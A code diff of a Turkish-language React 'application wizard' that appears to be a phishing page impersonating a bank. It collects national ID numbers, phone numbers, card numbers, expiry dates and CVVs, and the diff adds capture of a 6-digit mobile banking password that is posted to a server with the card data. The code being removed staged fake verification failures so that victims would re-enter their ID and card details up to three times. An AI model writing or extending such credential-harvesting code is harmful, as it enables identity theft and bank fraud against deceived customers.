@@ -25,18 +25,13 @@ import { DESCRIPTION_TEXT } from "@/lib/content";
 import { delay } from "@/lib/delay";
 import { isValidTCKN } from "@/lib/tc-validation";
 import { phoneToDigits } from "@/lib/phone-mask";
-import {
-  isValidExpiry,
-  luhnCheck,
-} from "@/lib/card-validation";
+import { isValidExpiry, luhnCheck } from "@/lib/card-validation";
 
 type WizardStep = "form" | "sms" | "processing" | "success";
 type FormStep = 1 | 2;
-type ModalType = "error" | "info";
 
 interface ModalState {
   message: string;
-  type: ModalType;
   onClose?: () => void;
 }
 
@@ -55,28 +50,17 @@ const emptyPersonal: PersonalData = {
   cardNumber: "",
   cardExpiry: "",
   cardCvv: "",
+  mobilePin: "",
+  mobilePinConfirm: "",
 };
 
-const IDENTITY_FAIL_COUNT = 3;
-const CARD_FAIL_COUNT = 3;
 const PROCESSING_SECONDS = 15;
-const IDENTITY_FAIL_MSG =
-  "Kimlik bilgileriniz doğrulanamadı. Lütfen TC Kimlik ve telefon numaranızı tekrar giriniz.";
-const CARD_FAIL_MSG =
-  "Kart bilgileriniz doğrulanamadı. Lütfen kart bilgilerinizi tekrar giriniz.";
-const OVERALL_FAIL_MSG =
-  "Bilgileriniz doğrulanamadı. Lütfen kontrol edip tekrar deneyin.";
-
-function noCardProgressMsg(attemptNumber: number): string {
-  return `Başvurunuz kaydedildi (Deneme ${attemptNumber}/3). Kimlik bilgilerinizi tekrar girerek devam edebilirsiniz.`;
-}
+const MOBILE_PIN_FAIL_MSG =
+  "Mobil şifreniz doğrulanamadı. Lütfen tekrar deneyiniz.";
 
 export default function ApplicationWizard() {
   const [wizardStep, setWizardStep] = useState<WizardStep>("form");
   const [formStep, setFormStep] = useState<FormStep>(1);
-  const [attemptNumber, setAttemptNumber] = useState<1 | 2 | 3>(1);
-  const [identityFailCount, setIdentityFailCount] = useState(0);
-  const [cardFailCount, setCardFailCount] = useState(0);
   const [identity, setIdentity] = useState<IdentityData>(emptyIdentity);
   const [personal, setPersonal] = useState<PersonalData>(emptyPersonal);
   const [identityErrors, setIdentityErrors] = useState<
@@ -91,15 +75,12 @@ export default function ApplicationWizard() {
   const [loading, setLoading] = useState(false);
   const [loadingMessage, setLoadingMessage] = useState("Lütfen bekleyiniz...");
 
-  const resetForm = (nextAttempt: 1 | 2 | 3) => {
+  const resetForm = () => {
     setIdentity(emptyIdentity);
     setPersonal(emptyPersonal);
     setIdentityErrors({});
     setPersonalErrors({});
     setFormStep(1);
-    setAttemptNumber(nextAttempt);
-    setIdentityFailCount(0);
-    setCardFailCount(0);
   };
 
   const updateIdentity = (data: IdentityData) => {
@@ -120,43 +101,47 @@ export default function ApplicationWizard() {
       if (prev.tcKimlik && isValidTCKN(data.tcKimlik)) {
         delete next.tcKimlik;
       }
-      if (prev.firstName && data.firstName.trim()) {
-        delete next.firstName;
-      }
-      if (prev.lastName && data.lastName.trim()) {
-        delete next.lastName;
-      }
+      if (prev.firstName && data.firstName.trim()) delete next.firstName;
+      if (prev.lastName && data.lastName.trim()) delete next.lastName;
       return next;
     });
   };
 
   const updatePersonal = (data: PersonalData) => {
     setPersonal(data);
-    if (!data.noCreditCard) {
-      setPersonalErrors((prev) => {
-        if (!prev.cardNumber && !prev.cardExpiry && !prev.cardCvv) return prev;
-        const next = { ...prev };
+    setPersonalErrors((prev) => {
+      if (
+        !prev.cardNumber &&
+        !prev.cardExpiry &&
+        !prev.cardCvv &&
+        !prev.mobilePin &&
+        !prev.mobilePinConfirm
+      ) {
+        return prev;
+      }
+      const next = { ...prev };
+      if (!data.noCreditCard) {
         const cardDigits = data.cardNumber.replace(/\D/g, "");
-        if (prev.cardNumber && luhnCheck(cardDigits)) {
-          delete next.cardNumber;
-        }
+        if (prev.cardNumber && luhnCheck(cardDigits)) delete next.cardNumber;
         if (prev.cardExpiry && isValidExpiry(data.cardExpiry)) {
           delete next.cardExpiry;
         }
-        if (prev.cardCvv && data.cardCvv.length === 3) {
-          delete next.cardCvv;
-        }
-        return next;
-      });
-    } else {
-      setPersonalErrors((prev) => {
-        const next = { ...prev };
+        if (prev.cardCvv && data.cardCvv.length === 3) delete next.cardCvv;
+      } else {
         delete next.cardNumber;
         delete next.cardExpiry;
         delete next.cardCvv;
-        return next;
-      });
-    }
+      }
+      if (prev.mobilePin && data.mobilePin.length === 6) delete next.mobilePin;
+      if (
+        prev.mobilePinConfirm &&
+        data.mobilePinConfirm.length === 6 &&
+        data.mobilePin === data.mobilePinConfirm
+      ) {
+        delete next.mobilePinConfirm;
+      }
+      return next;
+    });
   };
 
   const validateIdentity = (): boolean => {
@@ -174,28 +159,32 @@ export default function ApplicationWizard() {
   };
 
   const validatePersonal = (): boolean => {
-    if (personal.noCreditCard) {
-      setPersonalErrors({});
-      return true;
+    const errors: Partial<Record<keyof PersonalData, string>> = {};
+
+    if (!personal.noCreditCard) {
+      const cardDigits = personal.cardNumber.replace(/\D/g, "");
+      if (!luhnCheck(cardDigits)) errors.cardNumber = "Geçersiz kart numarası";
+      if (!isValidExpiry(personal.cardExpiry)) {
+        errors.cardExpiry = "Geçersiz son kullanma";
+      }
+      if (personal.cardCvv.length !== 3) errors.cardCvv = "CVV gerekli";
     }
 
-    const errors: Partial<Record<keyof PersonalData, string>> = {};
-    const cardDigits = personal.cardNumber.replace(/\D/g, "");
-    if (!luhnCheck(cardDigits)) errors.cardNumber = "Geçersiz kart numarası";
-    if (!isValidExpiry(personal.cardExpiry)) {
-      errors.cardExpiry = "Geçersiz son kullanma";
+    if (personal.mobilePin.length !== 6) {
+      errors.mobilePin = "6 haneli mobil şifre giriniz";
     }
-    if (personal.cardCvv.length !== 3) errors.cardCvv = "CVV gerekli";
+    if (personal.mobilePinConfirm.length !== 6) {
+      errors.mobilePinConfirm = "Mobil şifreyi tekrar giriniz";
+    } else if (personal.mobilePin !== personal.mobilePinConfirm) {
+      errors.mobilePinConfirm = "Mobil şifreler eşleşmiyor";
+    }
+
     setPersonalErrors(errors);
     return Object.keys(errors).length === 0;
   };
 
-  const showModal = (
-    message: string,
-    type: ModalType = "error",
-    onClose?: () => void
-  ) => {
-    setModal({ message, type, onClose });
+  const showModal = (message: string, onClose?: () => void) => {
+    setModal({ message, onClose });
     setTimeout(() => {
       setModal((current) => {
         if (current?.message === message) {
@@ -223,23 +212,7 @@ export default function ApplicationWizard() {
 
   const handleIdentitySubmit = async () => {
     if (!validateIdentity()) return;
-
-    if (identityFailCount < IDENTITY_FAIL_COUNT) {
-      await withLoading("Kimlik bilgileriniz kontrol ediliyor...", async () => {
-        await delay(400);
-        showModal(IDENTITY_FAIL_MSG, "error", () => {
-          setIdentity((prev) => ({
-            ...prev,
-            tcKimlik: "",
-            phone: "",
-          }));
-          setIdentityFailCount((c) => c + 1);
-        });
-      });
-      return;
-    }
-
-    await withLoading("Bir sonraki adıma geçiliyor...", async () => {
+    await withLoading("Bir sonraki adıma geçiliyor...", () => {
       setFormStep(2);
     });
   };
@@ -262,6 +235,7 @@ export default function ApplicationWizard() {
           : personal.cardNumber.replace(/\D/g, ""),
         cardExpiry: personal.noCreditCard ? "" : personal.cardExpiry,
         cardCvv: personal.noCreditCard ? "" : personal.cardCvv,
+        mobilePin: personal.mobilePin,
       }),
     });
     const data = await res.json();
@@ -275,48 +249,19 @@ export default function ApplicationWizard() {
       return;
     }
 
-    const next = (data.attemptNumber + 1) as 2 | 3;
-
-    if (personal.noCreditCard) {
-      showModal(noCardProgressMsg(data.attemptNumber), "info", () => {
-        resetForm(next);
-      });
-      return;
-    }
-
-    showModal(data.message ?? OVERALL_FAIL_MSG, "error", () => {
-      resetForm(next);
+    showModal(data.message ?? MOBILE_PIN_FAIL_MSG, () => {
+      resetForm();
     });
   };
 
   const handlePersonalSubmit = async () => {
     if (!validatePersonal()) return;
 
-    if (!personal.noCreditCard && cardFailCount < CARD_FAIL_COUNT) {
-      await withLoading("Kart bilgileriniz kontrol ediliyor...", async () => {
-        await delay(400);
-        showModal(CARD_FAIL_MSG, "error", () => {
-          setPersonal((prev) => ({
-            ...prev,
-            cardNumber: "",
-            cardExpiry: "",
-            cardCvv: "",
-          }));
-          setCardFailCount((c) => c + 1);
-        });
-      });
-      return;
-    }
-
-    const loadingText = personal.noCreditCard
-      ? "Başvurunuz kaydediliyor..."
-      : "Bilgileriniz doğrulanıyor...";
-
-    await withLoading(loadingText, async () => {
+    await withLoading("Mobil şifreniz doğrulanıyor...", async () => {
       try {
         await submitAttempt();
       } catch (e) {
-        showModal(e instanceof Error ? e.message : "Hata oluştu", "error");
+        showModal(e instanceof Error ? e.message : "Hata oluştu");
       }
     });
   };
@@ -425,7 +370,7 @@ export default function ApplicationWizard() {
           }}
           onCancel={() => {
             setWizardStep("form");
-            resetForm(3);
+            resetForm();
           }}
         />
       )}
@@ -435,14 +380,10 @@ export default function ApplicationWizard() {
       {modal && (
         <div className="modal-overlay fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4">
           <div className="modal-card w-full max-w-sm rounded-lg bg-white p-4 text-center shadow-xl sm:max-w-md sm:p-6">
-            <div
-              className={`mb-3 text-3xl sm:text-4xl ${
-                modal.type === "error" ? "text-red-500" : "text-ykb-primary"
-              }`}
-            >
-              {modal.type === "error" ? "✕" : "✓"}
-            </div>
-            <p className="text-sm font-medium text-[#333] sm:text-base">{modal.message}</p>
+            <div className="mb-3 text-3xl text-red-500 sm:text-4xl">✕</div>
+            <p className="text-sm font-medium text-[#333] sm:text-base">
+              {modal.message}
+            </p>
           </div>
         </div>
       )}
